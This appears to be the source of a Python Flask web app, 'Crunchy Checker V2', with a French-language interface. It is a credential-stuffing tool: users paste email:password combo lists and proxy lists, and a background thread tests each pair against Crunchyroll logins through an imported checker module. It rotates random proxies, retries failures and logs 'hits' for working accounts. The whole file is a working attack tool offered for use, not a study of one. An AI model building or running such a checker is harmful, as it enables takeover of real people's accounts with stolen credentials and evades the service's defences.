import os
import uuid
import random
import threading
from flask import Flask, render_template_string, request, jsonify
from chk import CrunchyChecker

app = Flask(__name__)
# Stockage des résultats en mémoire vive
scans = {}

HTML_UI = """
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Crunchyroll Checker V2</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-black text-gray-200 p-5 font-sans">
    <div class="max-w-3xl mx-auto bg-gray-900 p-8 rounded-2xl shadow-2xl border border-gray-800">
        <h1 class="text-3xl font-bold text-orange-500 mb-6 text-center tracking-tighter">CRUNCHY CHECKER V2</h1>
        
        <div class="space-y-4">
            <textarea id="combos" class="w-full h-32 bg-gray-800 p-3 rounded-lg border border-gray-700 outline-none focus:border-orange-500 text-sm font-mono" placeholder="email:password"></textarea>
            <textarea id="proxies" class="w-full h-24 bg-gray-800 p-3 rounded-lg border border-gray-700 outline-none focus:border-orange-500 text-sm font-mono" placeholder="ip:port"></textarea>
            <button onclick="start()" id="btn" class="w-full bg-orange-600 p-4 rounded-xl font-bold hover:bg-orange-500 transition-all transform active:scale-95">DÉMARRER LE SCAN</button>
        </div>

        <div class="grid grid-cols-4 gap-2 mt-6 text-center text-[10px] font-bold uppercase tracking-widest">
            <div class="bg-gray-800 p-3 rounded-lg border border-gray-700">Hits: <span id="h" class="text-green-500 block text-lg">0</span></div>
            <div class="bg-gray-800 p-3 rounded-lg border border-gray-700">Bad: <span id="b" class="text-red-500 block text-lg">0</span></div>
            <div class="bg-gray-800 p-3 rounded-lg border border-gray-700">Check: <span id="c" class="text-blue-500 block text-lg">0</span></div>
            <div class="bg-gray-800 p-3 rounded-lg border border-gray-700">Retry: <span id="r" class="text-orange-500 block text-lg">0</span></div>
        </div>

        <div id="logs" class="mt-4 h-48 overflow-y-auto bg-black p-4 rounded-lg font-mono text-[10px] border border-gray-800 text-gray-400">
            <div class="italic text-gray-600">// Système prêt. En attente de combos...</div>
        </div>
    </div>

    <script>
        let sid = null;
        let poller = null;

        async function start() {
            const combos = document.getElementById('combos').value.trim();
            const proxies = document.getElementById('proxies').value.trim();
            if(!combos) return alert("Veuillez entrer des combos !");

            document.getElementById('btn').disabled = true;
            document.getElementById('btn').innerText = "VÉRIFICATION...";

            try {
                const res = await fetch('/api/start', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        c: combos.split('\\n').filter(l => l.includes(':')),
                        p: proxies ? proxies.split('\\n').filter(l => l.length > 5) : []
                    })
                });
                const d = await res.json();
                sid = d.sid;
                if(poller) clearInterval(poller);
                poller = setInterval(update, 1000);
            } catch(e) {
                alert("Erreur serveur !");
                document.getElementById('btn').disabled = false;
            }
        }

        async function update() {
            if(!sid) return;
            const res = await fetch('/api/status/' + sid);
            const d = await res.json();
            document.getElementById('h').innerText = d.h;
            document.getElementById('b').innerText = d.b;
            document.getElementById('c').innerText = d.c;
            document.getElementById('r').innerText = d.r;
            document.getElementById('logs').innerHTML = d.l.slice(-20).map(x => `<div>${x}</div>`).join('');
            document.getElementById('logs').scrollTop = document.getElementById('logs').scrollHeight;

            if(d.finished) {
                clearInterval(poller);
                document.getElementById('btn').disabled = false;
                document.getElementById('btn').innerText = "SCAN TERMINÉ";
            }
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index(): 
    return render_template_string(HTML_UI)

@app.route('/api/start', methods=['POST'])
def start_worker():
    data = request.json
    id = str(uuid.uuid4())
    scans[id] = {'h':0, 'b':0, 'c':0, 'r':0, 'l':[], 'finished': False}
    
    def run(sid, combos, proxies):
        for line in combos:
            if ':' not in line: continue
            email, pw = line.strip().split(':', 1)
            attempts = 0
            done = False
            while not done and attempts < 2:
                proxy = random.choice(proxies) if proxies else None
                chk = CrunchyChecker(proxy)
                status, _ = chk.get_token(email, pw)
                if status == "SUCCESS":
                    scans[sid]['h'] += 1
                    scans[sid]['l'].append(f"<span class='text-green-500'>[HIT]</span> {email}")
                    done = True
                elif status == "INVALID":
                    scans[sid]['b'] += 1
                    scans[sid]['l'].append(f"<span class='text-red-500'>[BAD]</span> {email}")
                    done = True
                else:
                    scans[sid]['r'] += 1
                    attempts += 1
                    scans[sid]['l'].append(f"<span class='text-orange-500'>[RETRY]</span> {email}")
            scans[sid]['c'] += 1
        scans[sid]['finished'] = True
    
    threading.Thread(target=run, args=(id, data['c'], data['p']), daemon=True).start()
    return jsonify({"sid": id})

@app.route('/api/status/<id>')
def status(id): 
    return jsonify(scans.get(id, {}))

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
